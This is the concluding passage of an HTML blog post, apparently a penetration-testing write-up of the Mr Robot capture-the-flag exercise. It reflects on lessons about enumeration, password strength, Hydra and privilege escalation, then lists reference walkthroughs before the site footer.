<p>The exercise highlighted the significance of web enumeration, password security, and privilege escalation techniques. It reinforced the importance of maintaining strong and unique passwords to protect systems from brute-force attacks. Additionally, it showcased the power of tools like Hydra for automating password-cracking attempts and the importance of keeping web applications and plugins up-to-date to prevent potential exploitation. Several of the points taken and methods used were also similar to previous challenges with the BadStore.net, and it was interesting to see the similarities on some points, such as injecting code.</p>
<p>Overall, this exercise offered practical insights into real-world penetration testing scenarios, equipping me with essential skills and knowledge for future security challenges. It emphasized the significance of continuous learning and the critical role of ethical hacking in identifying and mitigating vulnerabilities to enhance overall cybersecurity.</p>
<p>References</p>
<p>Christophe Tafani-Dereeper, 2017. [Write Up] Mr Robot. <a href="https://blog.christophetd.fr/write-up-mr-robot">https://blog.christophetd.fr/write-up-mr-robot</a></p>
<p>ZeusCybersec, Sept. 2021. TryHackMe-Mr Robot CTF Writeup. <a href="https://sparshjazz.medium.com/tryhackme-mr-robot-ctf-writeup-d2ccad34e6b7">https://sparshjazz.medium.com/tryhackme-mr-robot-ctf-writeup-d2ccad34e6b7</a></p>
<p>Nwrzd, Sept. 2019. Vulnhub.com : Mr-Robot: 1 Walkthrough. <a href="https://nwrzd.medium.com/vulnhub-com-mr-robot-1-walkthrough-5119586b2a3f">https://nwrzd.medium.com/vulnhub-com-mr-robot-1-walkthrough-5119586b2a3f</a></p>
<p>Seven Layers, 2024. WordPress Plugin: Reverse Shell. <a href="https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell">https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell</a></p>
</article>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </main>
</div>
<script type="application/javascript" src='http://localhost:1313/js/toc.js'></script>
<link rel="stylesheet" href='http://localhost:1313/css/toc.css' />

  
</div>

  <div class="footer container-xl width-full p-responsive">
  <div
    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="http://localhost:1313/">
      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
        <path fill-rule="evenodd"
          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
        </path>
      </svg>
    </a>
    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
      
      <li class="mr-3 mr-lg-0">Theme by <a href='https://github.com/MeiK2333/github-style'>github-style</a></li>
      
      <li class="mr-3 mr-lg-0">GitHub and the Invertocat logo are trademarks of <a href="https://github.com/">GitHub, Inc.</a></li>
    </ul>
  </div>
  <div class="d-flex flex-justify-center pb-6">
    <span class="f6 text-gray-light"></span>
  </div>


</div>

</body>

<script type="application/javascript" src="http://localhost:1313/js/github-style.js"></script>







</html>